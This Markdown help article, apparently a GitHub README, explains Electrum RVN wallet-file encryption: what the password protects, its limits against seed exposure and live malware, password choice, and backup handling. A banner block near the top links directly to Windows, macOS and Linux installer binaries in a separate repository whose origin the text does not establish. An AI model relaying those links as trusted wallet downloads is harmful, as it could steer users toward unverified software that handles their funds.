![Electrum RVN](assets/banner-article.png)

# Wallet File Encryption in Electrum RVN

<!-- compact-download-block -->

<p align="center">How the file is locked and when keys are open</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
The wallet file is encrypted with the password you set when you created or restored the wallet. That encryption protects the file at rest: a copied file without the password is not spendable. It does not protect the seed, which is the thing that bypasses the file entirely.

## What the password protects

Three things, and it is worth being precise about the boundaries.

**The private keys in the file.** They are decrypted in memory only while a signature is being produced, which is why the password is asked for at signing rather than at launch.

**The file as an object.** Copying it to a USB stick, a backup disk or someone else's machine yields an encrypted blob. Without the password, it is not a wallet.

**Labels and history in the file.** They are protected by the same encryption, which is a small privacy benefit and the reason a copied file is not readable in a text editor.

What it does not protect: your seed, your addresses (public), and anything you do while the wallet is unlocked.

## What the password does not protect

**Against the seed.** Anyone with the twelve words restores the wallet and ignores your password entirely. That is the whole reason the seed is the backup and the file is not - [backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md).

**Against a compromised machine while unlocked.** Malware that can read memory can read a decrypted key during signing. The password protects a file at rest, not a running process.

**Against a weak password.** The encryption is only as strong as what you typed. A short or reused password makes a copied file a realistic target.

**Against deletion.** Encryption does not stop someone deleting the file; that is what a backup is for.

## Choosing a password

The right shape for a wallet file password:

- **long** rather than merely complex - a phrase of several words beats a short scramble;
- **unique** to this wallet, not reused from anything else;
- **reconstructible by you** without a hint written next to the seed;
- **not stored digitally** anywhere that syncs.

A forgotten password has no reset - [forgot your Electrum RVN password?](https://github.com/electrum-source/passphrase-backup/blob/main/forgot-your-electrum-rvn-password.md) - so the aim is a password strong enough to matter and memorable enough to keep. The seed is the safety net when memory fails.

## Why the seed bypasses it

The seed derives the keys; the file stores an encrypted copy of them. Encryption protects a copy; the source is elsewhere.

That asymmetry is deliberate and it is the design of every wallet in this family. It means:

- losing the file is survivable with the seed;
- losing the password is survivable with the seed;
- losing the seed while keeping the file leaves you dependent on remembering the password forever.

Which is why the paper matters more than the password, and why the two should never be stored together.

## At-rest protection in practice

| Situation | Protected by the password? |
| --- | --- |
| File copied from your disk | yes |
| Laptop stolen while powered off | yes |
| Laptop stolen while the wallet is unlocked | partially - the process has keys in memory |
| Cloud backup of your profile | yes, but it is still a copy on someone else's server |
| Someone watching you type the password | no |

The last two rows are the ones people underestimate: a synced copy is a copy, and a shoulder-surfed password is a password you no longer control.

## What to do with the file

- **Keep it local.** Not in a synced folder, not on a network share, not in an email - [where Electrum RVN stores your wallet](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md).
- **Back up the seed, not the file.** A file backup protects against a corrupted profile; the seed protects against everything else.
- **Copy deliberately when migrating**, wallet closed, over a cable or a removable disk - [moving Electrum RVN to another computer](https://github.com/electrum-source/passphrase-backup/blob/main/moving-electrum-rvn-to-another-computer.md).
- **Wipe properly when disposing of a machine**, because a deleted encrypted file is still a file.

## Encryption and the rest of the setup

File encryption is one layer. The others are the seed offline, the machine clean, and - for larger amounts - a signing device or a multisig threshold, so the keys are not on a general-purpose computer at all.

No single layer is sufficient on its own, which is the theme of [how safe is Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md) and of [what data does Electrum RVN collect?](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-data-collection.md).

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. [How to verify an Electrum RVN download](https://github.com/electrum-source/passphrase-backup/blob/main/how-to-verify-an-electrum-rvn-download.md) makes sure the encryption you are relying on is the one in the code you meant to run. If the file is gone entirely, [Electrum RVN recovery without the seed](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-recovery-without-the-seed.md) is the honest answer about limits.

## FAQ

### What encryption does the wallet file use?

The file is encrypted with a key derived from your password; the specific construction is in the open source. What matters practically: without the password, a copied file is not spendable.

### Can I open the file without the password?

No. The password is the only way into the file, and there is no reset.

### If I have the seed, do I need the password?

No. Restore from the seed into a new wallet and set a new password. Labels and local history stay behind in the old file.

### Is an encrypted file safe to back up to the cloud?

It is safer than an unencrypted one, and it is still a copy of your keys held by someone else. The seed on paper is the better backup.

### Does encryption protect against malware?

Only at rest. Malware running while the wallet is unlocked can reach decrypted keys during signing, which is why hardware signing exists.

<!-- related-articles -->

## Related articles

- [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md)
- [Forgot Your Electrum RVN Password](https://github.com/electrum-source/passphrase-backup/blob/main/forgot-your-electrum-rvn-password.md)
- [Where Electrum RVN Stores Your Wallet File](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md)
- [Moving Electrum RVN to Another Computer](https://github.com/electrum-source/passphrase-backup/blob/main/moving-electrum-rvn-to-another-computer.md)
